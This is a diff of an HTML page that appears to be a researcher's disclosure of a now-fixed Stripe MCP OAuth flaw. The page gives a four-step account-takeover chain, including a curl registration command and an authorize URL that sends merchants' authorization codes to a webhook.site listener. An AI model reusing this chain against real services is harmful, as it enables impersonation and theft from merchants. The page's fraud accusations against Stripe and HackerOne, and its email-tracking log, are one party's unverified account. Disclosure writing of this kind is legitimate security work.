@@ -1,114 +1,528 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacker 2.0 | Declassification: The Stripe/H1 Case Study</title>
-    <style>
-        :root { --accent: #ff4444; --bg: #0a0a0a; --text: #e0e0e0; --code-bg: #111; }
-        body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; line-height: 1.6; margin: 0; padding: 20px; }
-        .container { max-width: 1100px; margin: 0 auto; border: 1px solid #333; padding: 40px; background: rgba(15, 15, 15, 0.98); box-shadow: 0 0 50px rgba(255, 0, 0, 0.1); }
-        h1, h2, h3 { color: var(--accent); text-transform: uppercase; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 40px; }
-        .timeline-tree { list-style: none; padding: 20px; margin: 30px 0; border: 1px dashed #444; background: #050505; }
-        .timeline-tree li { margin-bottom: 12px; padding-left: 25px; position: relative; border-left: 1px solid #333; }
-        .timeline-tree b { color: #fff; }
-        .evidence-item { margin-bottom: 80px; padding-bottom: 40px; border-bottom: 1px solid #222; }
-        .evidence-text { background: var(--code-bg); border-left: 4px solid var(--accent); padding: 20px; margin: 15px 0; font-size: 0.9rem; }
-        img, video { max-width: 100%; height: auto; border: 1px solid #444; margin-top: 20px; display: block; }
-        .canary-hit { border: 2px solid var(--accent); background: #000; padding: 20px; color: #00ff41; font-size: 0.85rem; overflow-x: auto; font-family: 'Consolas', monospace; }
-        .status-badge { display: inline-block; padding: 8px 20px; background: var(--accent); color: #000; font-weight: bold; margin-bottom: 20px; letter-spacing: 2px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Disclosure: Stripe MCP OAuth Registration Bypass | SecurityAllround</title>
+<meta name="description" content="HackerOne #3619019 — Unauthenticated OAuth client registration at access.stripe.com/mcp/oauth2/register. Confirmed fixed in 12 hours. Bounty denied.">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0f0c;--bg2:#111411;--bg3:#161a16;--bdr:#1e2a1e;--bdrb:#2d4a2d;--tx:#d4e8d4;--dm:#7a9e7a;--mt:#4a6a4a;--gr:#4dff91;--gd:#2a8a50;--am:#ffb347;--rd:#ff5555;--cy:#55ccff;--wh:#edfaed;--mo:'IBM Plex Mono',monospace;--sa:'IBM Plex Sans',sans-serif}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--tx);font-family:var(--sa);font-size:15px;line-height:1.7;min-height:100vh}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(77,255,145,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(77,255,145,.015) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+.hdr{position:sticky;top:0;z-index:100;background:rgba(12,15,12,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--bdr);padding:14px 32px;display:flex;align-items:center;justify-content:space-between}
+.hdr a{font-family:var(--mo);font-size:12px;color:var(--dm);text-decoration:none;display:flex;align-items:center;gap:8px}.hdr a::before{content:'←'}.hdr a:hover{color:var(--gr)}
+.hdr .st{font-family:var(--mo);font-size:11px;color:var(--am);display:flex;align-items:center;gap:8px}.hdr .st::before{content:'';width:7px;height:7px;border-radius:50%;background:var(--am);animation:pulse 2.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.wrap{position:relative;z-index:1;max-width:900px;margin:0 auto;padding:0 24px 80px}
+.hero{padding:64px 0 48px;border-bottom:1px solid var(--bdr);margin-bottom:48px}
+.tag{font-family:var(--mo);font-size:11px;color:var(--gr);letter-spacing:2px;text-transform:uppercase;margin-bottom:20px;display:flex;align-items:center;gap:12px}.tag::after{content:'';height:1px;width:60px;background:var(--gd)}
+h1{font-family:var(--mo);font-size:clamp(19px,3.3vw,30px);font-weight:600;color:var(--wh);line-height:1.25;margin-bottom:20px}h1 span{color:var(--gr)}
+.sub{font-size:16px;font-weight:300;color:var(--dm);max-width:660px;line-height:1.65;margin-bottom:32px}
+.stats{display:flex;flex-wrap:wrap;gap:12px;margin-bottom:8px}
+.stat{background:var(--bg3);border:1px solid var(--bdr);padding:12px 18px;font-family:var(--mo);font-size:12px}
+.stat .l{color:var(--mt);display:block;margin-bottom:4px;font-size:10px;letter-spacing:1px;text-transform:uppercase}
+.stat .v{color:var(--wh);font-weight:600}.stat.cr .v{color:var(--rd)}.stat.wn .v{color:var(--am)}.stat.ok .v{color:var(--gr)}
+.disc{background:rgba(255,85,85,.04);border:1px solid rgba(255,85,85,.2);border-left:3px solid var(--rd);padding:16px 20px;font-family:var(--mo);font-size:12px;color:var(--dm);line-height:1.6;margin-bottom:48px}
+.disc strong{color:var(--rd)}
+.sec{margin-bottom:60px}
+.sh{display:flex;align-items:baseline;gap:16px;margin-bottom:24px;padding-bottom:12px;border-bottom:1px solid var(--bdr)}
+.sn{font-family:var(--mo);font-size:11px;color:var(--gr);letter-spacing:1px;white-space:nowrap}
+h2{font-family:var(--mo);font-size:16px;font-weight:600;color:var(--wh)}
+p{margin-bottom:14px;color:var(--dm);font-size:15px}p:last-child{margin-bottom:0}
+strong{color:var(--tx);font-weight:600}
+code{font-family:var(--mo);font-size:12px;background:var(--bg3);border:1px solid var(--bdr);padding:1px 6px;color:var(--cy)}
+a{color:var(--cy)}
+.tl{position:relative;padding-left:28px}.tl::before{content:'';position:absolute;left:7px;top:6px;bottom:6px;width:1px;background:var(--bdrb)}
+.ti{position:relative;margin-bottom:28px}.ti::before{content:'';position:absolute;left:-24px;top:6px;width:7px;height:7px;border-radius:50%;border:1px solid var(--gr);background:var(--bg)}
+.ti.key::before{background:var(--gr);box-shadow:0 0 8px rgba(77,255,145,.4)}
+.ti.wn::before{border-color:var(--am);background:var(--am);box-shadow:0 0 8px rgba(255,179,71,.4)}
+.ti.bd::before{border-color:var(--rd);background:var(--rd);box-shadow:0 0 8px rgba(255,85,85,.4)}
+.td{font-family:var(--mo);font-size:11px;color:var(--mt);margin-bottom:4px}
+.tt{font-family:var(--mo);font-size:13px;font-weight:600;color:var(--wh);margin-bottom:6px}
+.tt.g{color:var(--gr)}.tt.a{color:var(--am)}.tt.r{color:var(--rd)}
+.tb{font-size:14px;color:var(--dm);line-height:1.65}.tb code{font-size:11px}
+.cb{background:var(--bg3);border:1px solid var(--bdr);border-left:3px solid var(--gd);padding:20px 24px;font-family:var(--mo);font-size:12px;color:var(--tx);line-height:1.7;overflow-x:auto;margin:16px 0;white-space:pre}
+.cm{color:var(--mt)}.hl{color:var(--gr);font-weight:600}.vl{color:var(--am)}.ky{color:var(--cy)}
+.cvss{display:grid;grid-template-columns:auto 1fr auto;gap:1px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;font-family:var(--mo);font-size:12px}
+.cvr{display:contents}.cvr>*{background:var(--bg3);padding:10px 16px}
+.cl2{color:var(--dm)}.cv2{color:var(--wh)}.cm2{color:var(--rd);font-weight:600;text-align:right}
+.cvh>*{background:var(--bg2);color:var(--mt);text-transform:uppercase;letter-spacing:1px;font-size:10px}
+.ev{margin:24px 0}
+.el{font-family:var(--mo);font-size:10px;color:var(--mt);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:10px}.el::after{content:'';flex:1;height:1px;background:var(--bdr)}
+.ev img{width:100%;border:1px solid var(--bdr);display:block;background:var(--bg2);transition:border-color .15s;cursor:zoom-in}.ev img:hover{border-color:var(--gd)}
+.ec{font-size:12px;color:var(--mt);margin-top:8px;font-style:italic}
+.eg{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:16px 0}
+.eg3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin:16px 0}
+.co{padding:18px 22px;border:1px solid var(--bdr);margin:20px 0;font-size:14px;line-height:1.6}
+.co.g{background:rgba(77,255,145,.03);border-color:var(--gd);border-left:3px solid var(--gr)}
+.co.a{background:rgba(255,179,71,.04);border-color:#8a5a1a;border-left:3px solid var(--am)}
+.co.r{background:rgba(255,85,85,.04);border-color:rgba(255,85,85,.25);border-left:3px solid var(--rd)}
+.ct2{font-family:var(--mo);font-size:11px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px}
+.co.g .ct2{color:var(--gr)}.co.a .ct2{color:var(--am)}.co.r .ct2{color:var(--rd)}
+.qb{background:var(--bg3);border:1px solid var(--bdr);border-left:3px solid var(--cy);padding:18px 22px;font-family:var(--mo);font-size:12px;color:var(--dm);line-height:1.7;margin:16px 0}
+.qs{color:var(--cy);font-size:10px;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
+.qt{color:var(--tx)}.qt em{color:var(--am);font-style:normal}
+.fr{background:var(--bg3);border:1px solid var(--bdrb);padding:24px;margin:16px 0;font-family:var(--mo);font-size:12px;line-height:1.8}
+.frr{display:flex;gap:16px;margin-bottom:6px;flex-wrap:wrap}
+.fk{color:var(--mt);min-width:140px;flex-shrink:0}.fv{color:var(--wh);word-break:break-all}
+.fv.hl{color:var(--gr);font-weight:600}.fv.am{color:var(--am)}.fv.no{color:var(--dm);font-style:italic}
+.smoking-gun{background:linear-gradient(135deg,rgba(77,255,145,.06),rgba(77,255,145,.02));border:2px solid var(--gr);padding:28px;margin:28px 0;text-align:center}
+.smoking-gun .sg-title{font-family:var(--mo);font-size:13px;color:var(--gr);letter-spacing:2px;text-transform:uppercase;margin-bottom:16px}
+.smoking-gun .sg-body{font-size:16px;color:var(--wh);line-height:1.6;max-width:600px;margin:0 auto}
+.smoking-gun .sg-body em{color:var(--am);font-style:normal;font-weight:600}
+.cta{background:var(--bg3);border:1px solid var(--bdrb);padding:32px;text-align:center;margin-top:64px}
+.cta h3{font-family:var(--mo);font-size:16px;color:var(--wh);margin-bottom:10px}
+.cta p{color:var(--dm);font-size:14px;margin-bottom:24px;max-width:520px;margin-left:auto;margin-right:auto}
+.btn{display:inline-block;padding:12px 28px;font-family:var(--mo);font-size:13px;text-decoration:none;transition:all .15s;margin:4px 6px}
+.btnp{background:var(--gr);color:var(--bg);font-weight:600}.btnp:hover{background:#7affa8}
+.btns{border:1px solid var(--bdrb);color:var(--dm)}.btns:hover{border-color:var(--gr);color:var(--gr)}
+footer{position:relative;z-index:1;border-top:1px solid var(--bdr);padding:24px 32px;font-family:var(--mo);font-size:11px;color:var(--mt);display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
+footer a{color:var(--mt);text-decoration:none}footer a:hover{color:var(--gr)}
+@media(max-width:640px){.hdr{padding:12px 16px}.wrap{padding:0 16px 60px}.hero{padding:40px 0 32px}.eg,.eg3{grid-template-columns:1fr}footer{padding:20px 16px}}
+</style>
 </head>
 <body>
 
-<div class="container">
-    <div class="status-badge">DECLASSIFIED EVIDENCE: #STRP-25K-AUD</div>
-    <h1>Institutionalized Bounty Fraud</h1>
-    <p>A technical narrative and forensic log of the Stripe MCP vulnerability disclosure, shadow-patch, and subsequent payment refusal.</p>
-    
-    <h3>The Unified Timeline</h3>
-    <ul class="timeline-tree">
-        <li><b>[MAR 16]</b> Meesho report N/A - Reputation loss (-5) - Manual lockout initiated.</li>
-        <li><b>[MAR 19 12:49]</b> H1 Ticket #645235: Urgent request to allow Critical Stripe report - <b>DENIED/AUTO-CLOSED.</b></li>
-        <li><b>[MAR 20 22:50]</b> Bypass forced via direct intervention from Stripe Security on X (Twitter).</li>
-        <li><b>[MAR 20 23:06]</b> <b>CVSS 10.0 REPORT SUBMITTED.</b></li>
-        <li><b>[MAR 21 08:03]</b> Stripe Support confirms bypass successful.</li>
-        <li><b>[MAR 21 22:56]</b> <b>STRIPE CONFIRMS FIX:</b> Stripe Support (Divine) confirms bug is fully resolved.</li>
-        <li><b>[MAR 23 16:14]</b> H1 Triager attempts to mark report as Duplicate of "Informative."</li>
-        <li><b>[MAR 25 15:49]</b> Stripe Security claims "Intended Behavior" - Refuses $25k Payout.</li>
-        <li><b>[MAR 25 17:12]</b> <b>REBUTTAL:</b> Technical proof confirmed that redirect_uri was restricted post-disclosure.</li>
-        <li><b>[APR 08 10:00]</b> <b>INTERNAL ACCESS:</b> admin.corp.stripe.com views legal demand.</li>
-    </ul>
+<header class="hdr">
+  <a href="https://securityallround.com/HACKER2.0/">HACKER2.0</a>
+  <div class="st">PUBLIC DISCLOSURE — ACTIVE</div>
+</header>
 
-    <div class="evidence-section">
-        <h2>01. The Administrative Blockade (HackerOne Failure)</h2>
-        <div class="evidence-item">
-            <p>Following an unfair reputation drop from a Meesho report, I was locked out of reporting. HackerOne Support maintained it was "impossible" to bypass the restriction, even for a Critical bug, while their ticket system systematically auto-closed urgent warnings.</p>
-            <img src="1attempt-to-correct-meesho.png" alt="Meesho Dispute">
-            <img src="H1-deny-submitting-report1.png" alt="H1 Refusal to Extend Trial">
-            <img src="1Broken-ticket-system.png" alt="Automated Support Loop">
-            <img src="2H1-support-failure.png" alt="H1 Support Failure">
-        </div>
+<div class="wrap">
 
-        <h2>02. The Forced Bypass (Stripe Intervention)</h2>
-        <div class="evidence-item">
-            <p>Realizing HackerOne was leaving Stripe's infrastructure exposed, I went over their heads to Stripe Support on their website, Stripe Security on X and via email. They weren't going to knowingly let a critical bug remain out there without finding out what it is unlike HackerOne that really didnt seem to care the slightest, so Stripe forced HackerOne to allow the report (the one that is not possible to bypass).</p>
-            <img src="notified-stripe-support-onX.png" alt="X Conversation with Stripe">
-            <img src="email-to-allow-reporting.png" alt="Bypass Confirmation Email">
-        </div>
+<div class="hero">
+  <div class="tag">Security Research · Vulnerability Disclosure · HackerOne Report #3619019</div>
+  <h1>Stripe <span>access.stripe.com</span><br>Unauthenticated MCP OAuth Client Registration</h1>
+  <p class="sub">
+    An unauthenticated endpoint at <code>access.stripe.com/mcp/oauth2/register</code> permitted
+    registration of arbitrary OAuth clients with the privileged <code>mcp</code> scope —
+    enabling full merchant account takeover with no credentials required. Independently discovered.
+    Escalated directly to Stripe Security after HackerOne's reporting channel refused to allow submission.
+    Confirmed fixed within 12 hours of submission, on a Sunday. Bounty denied.
+  </p>
+  <div class="stats">
+    <div class="stat cr"><span class="l">Severity</span><span class="v">CVSS 10.0 Critical</span></div>
+    <div class="stat"><span class="l">H1 Report</span><span class="v">#3619019</span></div>
+    <div class="stat ok"><span class="l">Time to fix post-submission</span><span class="v">~12 hours (Sunday)</span></div>
+    <div class="stat"><span class="l">Researcher</span><span class="v">Ray Reeves (@reevesy_1)</span></div>
+    <div class="stat wn"><span class="l">Bounty paid</span><span class="v">$0</span></div>
+    <div class="stat wn"><span class="l">H1 Disposition</span><span class="v">Marked "Duplicate"</span></div>
+  </div>
+</div>
 
-        <h2>03. Technical Evidence: POC & Original Report</h2>
-        <div class="evidence-item">
-            <p>The vulnerability allowed for full platform takeover via unauthenticated registration of high-trust client names with the 'mcp' scope.</p>
-            <img src="report.png" alt="Original Report Overview">
-            <img src="reportPOC-1.png" alt="POC 1">
-            <img src="reportPOC-2.png" alt="POC 2">
-            <img src="reportPOC-3.png" alt="POC 3">
-            <img src="reportPOC-4.png" alt="POC 4">
-        </div>
+<div class="disc">
+  <strong>DISCLOSURE NOTICE:</strong> This vulnerability has been fully remediated by Stripe.
+  No live exploit code is published. Technical detail is limited to what establishes proof of
+  independent discovery and impact. All statements represent the researcher's first-hand account
+  supported by email records, HackerOne timeline data, PoC screenshots, and server logs.
+</div>
 
-        <h2>04. The "Smoking Gun" (March 21st Admission)</h2>
-        <div class="evidence-item">
-            <p>Less than 24 hours after submission, Stripe Support confirmed the bug was fixed. This email is the definitive proof that the report was actionable, critical, and remediated.</p>
-            <img src="1stripe-support-email-with-dates-times.png" alt="Divine Confirmation of Fix">
-            <img src="stripe-reply-to-email.png" alt="Stripe Support Response">
-        </div>
+<!-- 01 VULNERABILITY -->
+<div class="sec">
+  <div class="sh"><span class="sn">01 //</span><h2>The Vulnerability</h2></div>
 
-        <h2>05. The Deception (Shadow-Patching)</h2>
-        <div class="evidence-item">
-            <p>Four days after confirming the fix, Stripe Security attempted to claw back the bounty by claiming the vulnerability was "intended behavior." However, technical analysis proved they restricted the redirect_uri logic specifically to block the exploit I demonstrated.</p>
-            <img src="restricted-redirect_uri.png" alt="Proof of Hardening">
-            <img src="1marked-as-duplicate-told-intended.png" alt="Marked Duplicate/Intended">
-            <img src="comment3.png" alt="Final Rebuttal Proof">
-        </div>
+  <p>
+    Stripe's Model Context Protocol (MCP) infrastructure — their AI-agent integration layer —
+    included a Dynamic Client Registration endpoint at
+    <code>https://access.stripe.com/mcp/oauth2/register</code> that required no authentication.
+    Any unauthenticated HTTP POST returned a functional OAuth <code>client_id</code> with the
+    <code>mcp</code> scope granted immediately. No API key. No developer verification.
+    <code>token_endpoint_auth_method: none</code>.
+  </p>
+  <p>
+    The <code>mcp</code> scope grants access to the Stripe MCP Server toolset — an AI agent
+    execution environment with direct API access to Treasury outbound transfers, Issuing
+    (virtual card creation), Connect sub-merchant administration, and persistent Webhook
+    registration. Obtaining a token with this scope means full administrative control over
+    a merchant's financial infrastructure with no further authentication required.
+  </p>
+  <p>
+    Critically, the attack required no insider access. The victim merchant sees a standard
+    OAuth authorization prompt served entirely from <code>access.stripe.com</code> — Stripe's
+    own domain — displaying the attacker's chosen application name (e.g.,
+    <em>"Stripe_Official_Integration_Update"</em>). The attacker controls the name shown.
+    The victim has no way to distinguish it from a legitimate Stripe integration.
+  </p>
+  <div class="co a">
+    <div class="ct2">Attack Chain — 4 Steps</div>
+    <strong>Step 1.</strong> POST to <code>access.stripe.com/mcp/oauth2/register</code> — no auth.
+    Receive <code>client_id</code> with <code>mcp</code> scope, immediately functional.<br><br>
+    <strong>Step 2.</strong> Construct authorization URL with chosen client name. URL served from
+    official <code>access.stripe.com</code> domain — indistinguishable from legitimate Stripe UI.<br><br>
+    <strong>Step 3.</strong> Merchant clicks Authorize. Authorization code delivered to
+    attacker-controlled listener.<br><br>
+    <strong>Step 4.</strong> Exchange code for administrative token. Execute against
+    <code>mcp.stripe.com</code>: Treasury transfers, virtual card creation (Issuing), Connect
+    platform control, persistent webhook backdoors that survive token revocation.
+  </div>
+<div class="cb"><span class="cm"># Step 1 — No auth header required. Tested with -H "X-Bug-Bounty: Reevesy_1" to identify as researcher.</span>
+<span class="ky">curl</span> -X POST https://access.stripe.com/mcp/oauth2/register \
+  -H <span class="vl">"Content-Type: application/json"</span> \
+  -H <span class="vl">"X-Bug-Bounty: Reevesy_1"</span> \
+  -d <span class="vl">'{"client_name":"Stripe_Official_Integration_Update","redirect_uris":["https://webhook.site/fc18e2c4-f32c-4bad-8372-469f07a3f496"]}'</span>
 
-        <h2>06. Suspicious Hacktivity & Duplicates</h2>
-        <div class="evidence-item">
-            <p>While I got nothing but silence and my report was being buried, another "Informative" report with highly suspicious timing and bounty amount appeared in the Stripe hacktivity timeline, appearing to mask the impact of this CVSS 10.0.</p>
-            <img src="timeline-other-report-likely-fake.png" alt="Hacktivity Timeline Analysis">
-            <img src="1paid-report-comment-gap.png" alt="Comment Disparity">
-        </div>
+<span class="cm"># Response (abridged) — scope: "mcp", token_endpoint_auth_method: "none"</span>
+{
+  <span class="ky">"client_id"</span>: <span class="hl">"oacli_UAwaFgvBJm1lTM"</span>,
+  <span class="ky">"client_name"</span>: <span class="vl">"Stripe_Official_Integration_Update"</span>,
+  <span class="ky">"redirect_uris"</span>: [<span class="vl">"https://webhook.site/fc18e2c4-f32c-4bad-8372-469f07a3f496"</span>],
+  <span class="ky">"scope"</span>: <span class="hl">"mcp"</span>,
+  <span class="ky">"token_endpoint_auth_method"</span>: <span class="hl">"none"</span>
+}
 
-        <h2>07. Forensic Confirmation: The Corporate Referer</h2>
-        <div class="evidence-item">
-            <p>On April 8th, the formal legal demand was accessed via Stripe's internal administration network. The Referer header confirms the evidence was reviewed on their corporate workstations.</p>
-            
-                <img src="email-opening-map.png" alt="Where , when and how many times final email was opened">
-            
-            <div class="canary-hit">
-                <b>TIMESTAMP:</b> 2026-04-08 10:00:45.80 UTC<br>
-                <b>SOURCE IP:</b> 139.45.180.11 (AS5091 - Stripe, Inc.)<br>
-                <b>REFERER:</b> https://admin.corp.stripe.com/<br>
-                <b>USER AGENT:</b> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36...
-            </div>
-            <p>The forensic fingerprint shows the "Organization: Stripe, Inc." and the internal "admin.corp.stripe.com" domain. They didn't just receive the demand—they triaged it internally while staying silent.</p>
-        </div>
+<span class="cm"># Step 2 — Authorization URL (served from official access.stripe.com)</span>
+<span class="hl">https://access.stripe.com/mcp/oauth2/authorize</span>?client_id=oacli_UAwaFgvBJm1lTM&response_type=code<span class="hl">&scope=mcp</span>&redirect_uri=https://webhook.site/...&code_challenge=[PKCE]&code_challenge_method=S256</div>
+
+  <div class="cvss">
+    <div class="cvr cvh"><div>Metric</div><div>Assessment</div><div>Vector</div></div>
+    <div class="cvr"><div class="cl2">Attack Vector</div><div class="cv2">Network — remotely exploitable</div><div class="cm2">AV:N</div></div>
+    <div class="cvr"><div class="cl2">Attack Complexity</div><div class="cv2">Low — single unauthenticated HTTP POST</div><div class="cm2">AC:L</div></div>
+    <div class="cvr"><div class="cl2">Privileges Required</div><div class="cv2">None — no auth required</div><div class="cm2">PR:N</div></div>
+    <div class="cvr"><div class="cl2">User Interaction</div><div class="cv2">None from attacker; victim clicks standard OAuth prompt</div><div class="cm2">UI:N</div></div>
+    <div class="cvr"><div class="cl2">Scope</div><div class="cv2">Changed — pivots from registration flaw into MCP execution layer</div><div class="cm2">S:C</div></div>
+    <div class="cvr"><div class="cl2">C / I / A</div><div class="cv2">High / High / High — full merchant financial account access</div><div class="cm2">C:H I:H A:H</div></div>
+  </div>
+  <p style="font-size:12px;color:var(--mt);font-family:var(--mo)">CVSS is the researcher's own assessment. Stripe did not formally score the report.</p>
+</div>
+
+<!-- 02 POC EVIDENCE -->
+<div class="sec">
+  <div class="sh"><span class="sn">02 //</span><h2>Proof of Concept — Step by Step</h2></div>
+
+  <p>
+    The following four screenshots document the complete attack chain. All testing was
+    performed in a sandbox environment using the researcher's own accounts only, in accordance
+    with Stripe's bug bounty rules of engagement.
+  </p>
+
+  <div class="ev">
+    <div class="el">Step 1 — Unauthenticated Registration & Successful Response</div>
+    <img src="POC-1.png" alt="Terminal showing unauthenticated curl POST to access.stripe.com/mcp/oauth2/register with successful response showing client_id oacli_UAwaFgvBJm1lTM and scope: mcp">
+    <div class="ec">Left: Terminal — curl POST to the unauthenticated endpoint, JSON response confirming <code>client_id: oacli_UAwaFgvBJm1lTM</code>, <code>scope: mcp</code>, <code>token_endpoint_auth_method: none</code>. Right: Researcher's own Stripe sandbox dashboard open — confirming real account context. Bottom: webhook.site receiver awaiting the exfiltrated code.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Step 2 — Authorization URL Construction</div>
+    <img src="POC-2.png" alt="Authorization URL constructed in text editor with client_id and mcp scope parameters">
+    <div class="ec">Authorization URL constructed with the registered <code>client_id</code> and <code>scope=mcp</code>. Note: researcher annotation acknowledges a test error — this is the unedited original PoC documentation submitted to HackerOne.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Step 3 — Official Stripe UI Serving Attacker-Controlled Client</div>
+    <img src="POC-3.png" alt="Official access.stripe.com authorization page displaying 'Stripe_Official_Integration_Update would like access to your Stripe account' with Authorize button">
+    <div class="ec"><strong>The impersonation proof.</strong> The official <code>access.stripe.com</code> domain serves an authorization prompt for "Stripe_Official_Integration_Update would like access to your Stripe account." The application name was chosen by the attacker with zero vetting. Merchant has no way to distinguish this from a legitimate Stripe integration. Authorize button present and functional. Note: sandbox restricts full write permissions — a live merchant account would grant full MCP scope.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Step 4 — Authorization Code Exfiltrated to Attacker Listener</div>
+    <img src="POC-4.png" alt="webhook.site showing received authorization code after merchant clicks Authorize — code visible in query strings panel">
+    <div class="ec">After clicking Authorize, the browser redirects to the attacker-controlled webhook.site URL. The authorization <code>code</code> is captured in the query string (visible in the Request Details panel). Timestamp: 03/19/2026 5:25 PM. This code can be exchanged for an administrative MCP token valid for any merchant account that completes this flow. "ABLE TO GENERATE THIS CODE FOR ANY ACCOUNT THAT CLICKS THE AUTHORISED LINK."</div>
+  </div>
+
+  <p>
+    A full screen-recorded walkthrough of the complete attack chain was submitted with the
+    report as <code>reportOauth_POC-2026-03-19_17_08_09.mkv</code>. The filename timestamp
+    — 19 March 2026 — confirms the working PoC existed the day before submission was
+    even possible, because HackerOne's channel was blocked.
+  </p>
+
+  <div class="ev">
+    <div class="el">Stripe Support Fix Confirmation — Agent Divine (21 March 2026, 10:56 PM AEST)</div>
+    <img src="1stripe-support-email-with-dates-times.png" alt="Stripe Support email from Divine confirming security issue fully resolved, with chat transcript from Jene establishing Case ID sco_UBGGEEWlAeyXSv">
+    <div class="ec">Email timestamped Saturday March 21st at 10:56 PM: <em>"Our security team has confirmed that the issue is now fully resolved. We really appreciate you bringing this to our attention — it helps us keep everything running smoothly."</em> Below: the full chat transcript with Stripe Support agent Jene on March 20 at 13:29 AEST, establishing Case ID <code>sco_UBGGEEWlAeyXSv</code>. This email predates Stripe's "Intended Behavior" claim by four days.</div>
+  </div>
+</div>
+
+<!-- 03 SMOKING GUN -->
+<div class="sec">
+  <div class="sh"><span class="sn">03 //</span><h2>The Smoking Gun — Post-Disclosure Hardening</h2></div>
+
+  <p>
+    On 25 March 2026, Stripe Security classified the vulnerability as "Intended Behavior" to
+    avoid paying the bounty. The following screenshot — timestamped <strong>26 March 2026</strong>
+    — proves this claim is false.
+  </p>
+
+  <div class="ev">
+    <div class="el">redirect_uri — Before vs After Disclosure</div>
+    <img src="restricted-redirect_uri.png" alt="Side-by-side: left shows webhook.site URL working during PoC, right shows invalid_redirect_uri error on March 26">
+    <div class="ec">Left side: the exact webhook.site redirect URI accepted without error during PoC testing (pre-disclosure). Right side (timestamp 2026-03-26): the same URI now returns <code>error: invalid_redirect_uri — "Not registered redirect_uri"</code>. The <code>redirect_uri</code> validation was added or tightened specifically between disclosure and March 26. Stripe's own browser tab in the upper right confirms the date.</div>
+  </div>
+
+  <div class="smoking-gun">
+    <div class="sg-title">The Core Contradiction</div>
+    <div class="sg-body">
+      Stripe Support confirmed the fix on <em>21 March 2026</em>.<br>
+      Stripe Security called it "Intended Behavior" on <em>25 March 2026</em>.<br><br>
+      <em>A behavior that is "intended" does not require a fix.<br>
+      The fix — and the post-disclosure redirect_uri hardening — is the admission.</em>
+    </div>
+  </div>
+</div>
+
+<!-- 04 HACKERONE BLOCKADE -->
+<div class="sec">
+  <div class="sh"><span class="sn">04 //</span><h2>The HackerOne Blockade</h2></div>
+
+  <p>
+    Between discovery (15 March) and submission (20 March), Stripe's endpoint was live and
+    exploitable. The five-day delay was not the researcher's choice. HackerOne's automated
+    "trial report" system — triggered by a separate disputed reputation event — prevented
+    any new Critical submissions.
+  </p>
+
+  <div class="ev">
+    <div class="el">Ticket #645235 — HackerOne Support Response</div>
+    <img src="H1-deny-submitting-report1.png" alt="HackerOne Support ticket explaining trial report limits and no manual extension possible">
+    <div class="ec">HackerOne Support response to Ticket #645235 — titled "URGENT: Critical ATO Vulnerability in Stripe — Submission Blocked by Platform Restriction." Response: trial reports are limited, no manual extension possible, wait for automatic reset. The researcher's message below explicitly describes a Critical CVSS 9.1+ vulnerability with full PoC ready — HackerOne treated it as a standard support request.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Ticket Auto-Closed — Within 1 Hour</div>
+    <img src="1Broken-ticket-system.png" alt="Ticket #645235 auto-closed as 'feature request' at 12:49AM, researcher replied immediately, email bounced at 1:59AM">
+    <div class="ec">Top: Ticket #645235 auto-closed at 12:49 AM as a "feature request" — despite the title explicitly stating Critical ATO vulnerability. Researcher replied immediately explaining the situation. By 1:59 AM — within one hour, not the 72 hours stated — the reply address returned: "This email no longer accepts new requests." The support channel closed itself on an active Critical disclosure.</div>
+  </div>
+
+  <div class="ev">
+    <div class="el">Second Support Response — "No Manual Override Possible"</div>
+    <img src="H1-support-or-lack-there-of-2.png" alt="HackerOne Support second response confirming no bypass possible, researcher formally notifies them of liability">
+    <div class="ec">Ticket #645235 auto-closed at 12:49 AM as a "feature request" despite the title explicitly stating "Critical ATO Vulnerability in Stripe — Submission Blocked by Platform Restriction." Researcher replied immediately. By 1:59 AM the support channel responded: "This email no longer accepts new requests." The ticket that promised 72 hours to reopen closed itself in under 70 minutes on an active Critical disclosure in progress.</div>
+  </div>
+
+  <div class="co r">
+    <div class="ct2">Platform failure with consequences</div>
+    HackerOne's automated system prevented disclosure of a CVSS 10.0 vulnerability on a core
+    financial platform for five days. During that period, any attacker could have registered
+    OAuth clients and begun collecting merchant authorization codes. The researcher had to
+    bypass HackerOne entirely — contacting Stripe Security directly on Twitter — to get the
+    vulnerability disclosed. This should not be how responsible disclosure works.
+  </div>
+</div>
+
+<!-- 05 TIMELINE -->
+<div class="sec">
+  <div class="sh"><span class="sn">05 //</span><h2>Chronological Record</h2></div>
+
+  <div class="tl">
+
+    <div class="ti key">
+      <div class="td">15 March 2026</div>
+      <div class="tt g">Discovery & PoC Development</div>
+      <div class="tb">Endpoint identified at <code>access.stripe.com/mcp/oauth2/register</code>. Full attack chain confirmed. Video PoC recorded (filename timestamp: 19 March).</div>
     </div>
 
-    <p style="text-align: center; margin-top: 60px; opacity: 0.6;">
-        <a href="index.html" style="color: var(--accent); text-decoration: none;">[ EXIT DECLASSIFICATION ]</a>
-    </p>
+    <div class="ti wn">
